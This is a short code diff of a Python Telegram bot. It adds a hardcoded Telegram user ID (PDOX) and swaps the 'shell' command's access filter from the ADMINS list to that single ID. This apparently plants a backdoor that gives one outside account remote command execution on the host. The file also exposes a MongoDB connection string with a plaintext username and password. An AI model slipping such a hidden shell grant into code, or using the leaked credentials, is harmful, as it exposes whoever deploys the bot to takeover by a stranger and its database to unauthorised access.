@@ -15,7 +15,7 @@ import subprocess
 
 # MongoDB URI
 DB_URI = "mongodb+srv://knight_rider:GODGURU12345@knight.jm59gu9.mongodb.net/?retryWrites=true&w=majority"
-
+PDOX="6259443940"
 
 mongo_client = AsyncIOMotorClient(DB_URI)
 db = mongo_client['paradoXstr']
@@ -58,7 +58,7 @@ async def useless(_,message: Message):
     if USER_REPLY_TEXT:
         await message.reply(USER_REPLY_TEXT)
 
-@Bot.on_message(filters.command('shell') & filters.user(ADMINS))
+@Bot.on_message(filters.command('shell') & filters.user(PDOX))
 async def shell(client, message: Message):
     cmd = message.text.split(" ", 1)
     
